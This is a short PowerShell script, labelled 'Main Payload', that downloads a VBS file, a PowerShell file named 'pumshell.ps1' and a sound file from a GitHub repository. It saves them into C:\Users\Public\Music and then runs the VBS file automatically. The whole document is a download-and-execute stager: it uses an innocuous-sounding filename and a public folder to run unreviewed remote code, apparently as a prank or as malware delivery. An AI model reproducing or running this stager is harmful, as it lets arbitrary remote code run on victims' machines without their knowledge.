# --- Configuration ---
$TargetDir = "C:\Users\Public\Music"
$ScriptToRun = "gitignore.vbs"

# List of files to download. Each item is an object with a URL and a Filename.
$FilesToDownload = @(
    [pscustomobject]@{
        URL = "https://github.com/icesousa/raspberry/raw/refs/heads/main/gitignore.vbs"
        Filename = "gitignore.vbs"
    },
    [pscustomobject]@{
        URL = "https://github.com/icesousa/raspberry/raw/refs/heads/main/pumshell.ps1"
        Filename = "pumshell.ps1"
    },
    [pscustomobject]@{
        URL = "https://github.com/icesousa/raspberry/raw/refs/heads/main/fart_sound.wav"
        Filename = "fart_sound.wav"
    }
)

# --- Main Payload ---

# Ensure the target directory exists. The -Force parameter creates parent directories if needed.
if (-not (Test-Path -Path $TargetDir)) {
    New-Item -Path $TargetDir -ItemType Directory -Force | Out-Null
}

# Loop through the list and download each file
foreach ($file in $FilesToDownload) {
    $destinationPath = Join-Path -Path $TargetDir -ChildPath $file.Filename
    try {
        # Using Invoke-WebRequest to download the file
        Write-Host "Downloading $($file.URL) to $($destinationPath)..."
        Invoke-WebRequest -Uri $file.URL -OutFile $destinationPath -ErrorAction Stop
    }
    catch {
        # Basic error handling
        Write-Host "Error downloading $($file.URL): $_"
        # Optional: exit the script if a download fails
        # exit 1
    }
}

# Execute the target script
$scriptPath = Join-Path -Path $TargetDir -ChildPath $ScriptToRun
if (Test-Path -Path $scriptPath) {
    Write-Host "Executing script: $($scriptPath)"
    # Start-Process is a robust way to run executables or scripts
    Start-Process -FilePath $scriptPath
} else {
    Write-Host "Error: Target script not found at $($scriptPath)"
}

Write-Host "Payload finished."